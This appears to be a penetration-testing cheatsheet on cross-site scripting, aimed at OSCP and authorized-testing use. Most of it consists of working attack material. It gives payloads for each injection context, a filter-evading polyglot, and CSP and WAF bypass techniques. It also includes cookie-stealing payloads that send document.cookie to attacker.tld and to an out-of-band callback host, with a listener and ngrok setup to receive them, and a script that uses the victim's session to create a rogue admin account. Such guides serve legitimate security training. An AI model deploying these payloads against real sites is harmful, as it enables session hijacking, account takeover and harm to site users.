# XSS (Cross-Site Scripting)

> Detection, payloads by context, blind XSS, session hijacking, filter bypass.
> Reflected, stored, DOM-based. Includes CSP and WAF context.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection (Manual)](#3-detection-manual)
- [4. Payloads by Context](#4-payloads-by-context)
- [5. Blind XSS](#5-blind-xss)
- [6. Session Hijacking](#6-session-hijacking)
- [7. CSRF via XSS](#7-csrf-via-xss)
- [8. DOM-Based XSS](#8-dom-based-xss)
- [9. Bypassing Filters and WAF](#9-bypassing-filters-and-waf)
- [10. Common Tools](#10-common-tools)
- [11. OSCP Notes](#11-oscp-notes)
- [12. Cheatsheet](#12-cheatsheet)
- [13. References](#13-references)

---

## 1. Overview

XSS = attacker-controlled JavaScript executes in the victim browser in
the context of the target origin.

**Three families:**

| Family | Where the payload lands | Example |
|--------|-------------------------|---------|
| Reflected | Immediate response | query string payload reflected back |
| Stored | Saved on the server, rendered later | comment, profile, ticket |
| DOM-based | Client-side JS writes user input to a sink | innerHTML = location.hash |

**Impact:**

- Session hijacking (steal cookie or session token).
- Phishing in the trusted origin.
- Keylogger in the victim browser.
- CSRF bypass (read the CSRF token from the DOM and issue the request).
- Admin takeover (stored XSS on an admin-visited page).

**On OSCP:** XSS is mostly a step in a chain - stored XSS reaching an admin,
stealing their session, or triggering an internal fetch. Reflected XSS alone
is rarely the goal.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Reflected probe with benign payload (alert(1), console.log) | [PROD-RISK] |
| Stored XSS insertion | [PROD-NO] (may hit real admins) |
| Blind XSS payload on a contact form | [PROD-NO] (fires on real employees) |
| Stealing cookies / session tokens | [PROD-NO] (touches real accounts) |
| Triggering a full CSRF chain in production | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT inject stored XSS into production content that real users see.
- Do NOT steal real user cookies or session tokens.
- Do NOT run keyloggers in production.
- Do NOT trigger admin-only endpoints via CSRF+XSS without approval.
- Do NOT test reflected XSS on every parameter with a fuzzer (noise + WAF).

In production, XSS tests are usually limited to non-exploitative proof
(alert(document.domain)) on your own test account, then reported.

### 2.3 Rate limiting

XSS payloads are individual requests, not brute-force. Rate limits matter
mainly for fuzzers (XSStrike, dalfox):

```bash
dalfox url http://target/?q=test --delay 500 --workers 1   # PROD
```

---

## 3. Detection (Manual)

### 3.1 Basic probes

Send a unique string and see where it appears in the response.

```bash
UNIQ=xss-$(date +%s)
curl -s 'http://target/search?q='$UNIQ | grep -n $UNIQ
```

Then try breaking out of the current context.

```bash
curl -s 'http://target/search?q=<script>alert(1)</script>'
curl -s 'http://target/search?q=<img+src=x+onerror=alert(1)>'
curl -s 'http://target/search?q=<svg+onload=alert(1)>'
```

**Check where the string lands:**

- HTML body: script tag, img onerror, svg onload should execute.
- Attribute: break out with a double or single quote, add an event handler.
- Inside a script tag: break the string, inject a closing tag or a new expression.
- Inside CSS: use expression() or url(javascript:) (old).

### 3.2 Context matters

Payload that works in HTML body will NOT work inside an attribute.
Detect the context first, then pick a payload (see section 4).

### 3.3 Encoded / filtered

If the less-than sign is stripped or encoded, try:

- HTML entity: &lt;script&gt; - only works if not re-encoded.
- Double encoding: %253Cscript%253E.
- Alternative tags: svg, img, body onload, details open ontoggle.
- Alternative event handlers: onerror, onload, onfocus, onpointerover.

### 3.4 DOM-based sources and sinks

Sources (attacker-controlled input reaching JS):

- location.hash, location.search, location.pathname
- document.URL, document.documentURI
- document.referrer
- window.name
- postMessage data

Sinks (where the value is executed):

- innerHTML, outerHTML
- document.write, document.writeln
- eval, Function, setTimeout(string), setInterval(string)
- location assignment (javascript:)
- jQuery: .html(), .append()

See section 8 for DOM-based testing workflow.

---

## 4. Payloads by Context

### 4.1 HTML body

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src=javascript:alert(1)></iframe>
```

### 4.2 Inside an attribute

Double-quoted attribute (break out with a double quote):

```html
" onmouseover="alert(1)"
" autofocus onfocus="alert(1)"
"><script>alert(1)</script>
```

Single-quoted attribute (break out with a single quote):

```html
' onmouseover='alert(1)'
' autofocus onfocus='alert(1)'
'><script>alert(1)</script>
```

Unquoted attribute:

```html
 autofocus onfocus=alert(1)
```

### 4.3 Inside a script tag

```javascript
</script><script>alert(1)</script>
";alert(1);//
';alert(1);//
`;alert(1);//
```

### 4.4 Inside a style tag

```html
</style><script>alert(1)</script>
body{background:url("javascript:alert(1)")}   /* old browsers */
```

### 4.5 URL / href / src

```html
<a href=javascript:alert(1)>click</a>
<a href=data:text/html,<script>alert(1)</script>>click</a>
<iframe src=data:text/html,<script>alert(1)</script>></iframe>
```

### 4.6 Polyglots (when context is unknown)

```html
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
```

Try a polyglot first, then narrow down to the exact context.

---

## 5. Blind XSS

Blind XSS = stored XSS that fires when an admin (or bot) visits the page
later. Common in: contact forms, support tickets, logs, chat, error reports.

### 5.1 Setup a listener

Option 1 - XSS Hunter (hosted or self-hosted):

```text
# https://xsshunter.com/ (or self-hosted)
# Generates a unique payload URL per test
```

Option 2 - interactsh (lightweight, CLI):

```bash
interactsh-client
# prints a URL like xyz.oast.fun
```

Option 3 - your own VPS + nginx access log:

```bash
python3 -m http.server 8000
# watch the access log for incoming requests
```

### 5.2 Payload

```html
<script src=//xyz.oast.fun></script>
<script>new Image().src="//xyz.oast.fun/"+document.cookie</script>
```

The callback proves execution and can carry the cookie.

### 5.3 Where to inject

- Contact / support forms
- Comment fields
- Profile bio, signature
- Ticket subjects and bodies
- User-Agent, Referer (if logged and viewed by admins)
- Error reporting / feedback features

### 5.4 Waiting

Blind XSS may take minutes to hours. Check the listener periodically.
In HTB/OSCP, admins are automated and usually visit quickly.

---

## 6. Session Hijacking

### 6.1 Cookie exfiltration

```html
<script>new Image().src="http://attacker.tld/c?"+document.cookie</script>
```

### 6.2 Receive the cookie

Minimal Python listener:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.path)
        self.send_response(200)
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Expose it to the target:

```bash
python3 listener.py
# in another terminal:
ngrok http 8000
# use the ngrok URL in the payload
```

### 6.3 Cookie flags to watch

| Flag | Effect |
|------|--------|
| HttpOnly | document.cookie cannot read it - XSS cannot steal directly |
| Secure | Only sent over HTTPS |
| SameSite=Strict/Lax | Limits cross-site cookie transmission |

### 6.4 If HttpOnly is set

You cannot read the cookie via JS. Alternatives:

- CSRF via XSS: read the CSRF token from the page and issue an authenticated request.
- Internal fetch: use the victim browser as a proxy to fetch internal data.
- Keylogger: capture keystrokes on login-like forms.
- Session fixation: sometimes still possible.

---

## 7. CSRF via XSS

XSS can bypass CSRF tokens because it runs same-origin - it can read the
token from the DOM.

### 7.1 Example: create an admin user

```html
<script>
fetch("/admin/users")
  .then(r => r.text())
  .then(html => {
    const m = html.match(/name="csrf" value="([^"]+)"/);
    const token = m ? m[1] : "";
    fetch("/admin/users/create", {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "csrf=" + token + "&username=pwn&password=pwn&role=admin"
    });
  });
</script>
```

Result: a new admin account, created via the victim authenticated session.

### 7.2 Notes

- Needs the CSRF token to be readable in the DOM.
- If the token is in a cookie (double-submit), read it from document.cookie.
- If same-origin policy blocks the request, adjust the target endpoint.

---

## 8. DOM-Based XSS

The server returns safe HTML; the client-side JS reads a source and writes
to a sink without sanitization.

### 8.1 Test workflow

1. Open the page with Burp + DOM Invader enabled.
2. Walk through the app; DOM Invader highlights sources and sinks.
3. Inject a canary through a source (URL param, hash, referrer).
4. Observe if it reaches a sink.

### 8.2 Sources and sinks reference

| Source | Sink | Payload |
|--------|------|---------|
| location.hash | innerHTML | img src=x onerror=alert(1) |
| location.search | document.write | script tag |
| document.referrer | eval | );alert(1);// |
| postMessage | Function | alert(1) |
| window.name | setTimeout | alert(1) |

### 8.3 Notes

- DOM XSS does not require a server round-trip - server log will not show it.
- Reflected vs DOM: reflected is server-side; DOM is client-side.
- Check the JS bundle for innerHTML, eval, document.write, .html(

---

## 9. Bypassing Filters and WAF

### 9.1 Common filter bypasses

- Case variation: <ScRiPt>, <IMG SRC=x OnErRoR=alert(1)>.
- Comment insertion: <scr<!---->ipt>, <img/**/src=x>.
- HTML entity encoding (if not re-encoded): &lt;script&gt;.
- Unicode escapes in JS: \\u0061lert(1).
- Alternative tags: svg, details, marquee, video, audio.
- Alternative events: onpointerover, ontoggle, onanimationstart.
- Whitespace alternatives: /, %09, %0a, %0d.

### 9.2 CSP bypass (if CSP header present)

Inspect the CSP policy:

```bash
curl -sI http://target | grep -i content-security-policy
```

Common weaknesses:

- unsafe-inline -> inline scripts allowed, no bypass needed.
- unsafe-eval -> eval() works.
- Wildcards: script-src * or script-src https: -> host a script on any HTTPS.
- JSONP endpoint in whitelist -> abuse it to load your code.
- nonce leaked in HTML -> use it in your payload.
- base-uri self missing -> base tag hijacks relative scripts.

Example with wildcard CSP:

```html
<script src=https://attacker.tld/payload.js></script>
```

### 9.3 WAF bypass

See [WAF-Detection.md](../01%20Recon/WAF-Detection.md) section 6 for encoding,
case, and comment insertion strategies. For XSS the common WAF trigger is
the string <script> - so onerror, onload, and encoded variants often pass
while <script> is blocked.

---

## 10. Common Tools

| Tool | Purpose |
|------|---------|
| Burp Suite (Repeater + DOM Invader) | Manual + DOM XSS |
| XSStrike | Automatic payload generation |
| dalfox | Fast XSS scanner |
| XSS Hunter | Blind XSS listener |
| interactsh-client | OOB callback listener |
| PayloadsAllTheThings | XSS payload list |
| SecLists XSS | XSS wordlists |

Examples:

```bash
# dalfox (LAB)
dalfox url http://target/?q=test
dalfox url http://target/?q=test --blind http://xyz.oast.fun

# dalfox (PROD, slow)
dalfox url http://target/?q=test --delay 500 --workers 1

# XSStrike
python3 xsstrike.py -u http://target/?q=test
```

---

## 11. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the XSS payload in the request.
> - Screenshot the JavaScript execution (alert box, DOM change, callback).
> - Screenshot the stolen cookie or session (redacted where needed).
> - If XSS leads to admin takeover: screenshot the admin panel accessed with the stolen session.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 12. Cheatsheet

### Basic probes

```bash
curl -s 'http://target/?q=<script>alert(1)</script>'
curl -s 'http://target/?q=<img+src=x+onerror=alert(1)>'
curl -s 'http://target/?q=<svg+onload=alert(1)>'
```

### Payloads by context

```html
<!-- HTML body -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>

<!-- double-quoted attribute -->
" autofocus onfocus="alert(1)
"><script>alert(1)</script>

<!-- inside script -->
</script><script>alert(1)</script>
";alert(1);//

<!-- URL -->
<a href=javascript:alert(1)>x</a>
```

### Cookie steal + listener

```html
<script>new Image().src="http://attacker.tld/c?"+document.cookie</script>
```

```bash
python3 -m http.server 8000
ngrok http 8000
```

### Blind XSS

```html
<script src=//xyz.oast.fun></script>
```

```bash
interactsh-client
```

---

## 13. References

- OWASP XSS - https://owasp.org/www-community/attacks/xss/
- PortSwigger XSS - https://portswigger.net/web-security/cross-site-scripting
- PayloadsAllTheThings XSS - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- XSStrike - https://github.com/s0md3v/XSStrike
- dalfox - https://github.com/hahwul/dalfox
- XSS Hunter - https://xsshunter.com/
- interactsh - https://github.com/projectdiscovery/interactsh

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../../03 API/02 REST.md](../../03%20API/02%20REST.md), [CSRF.md](./CSRF.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
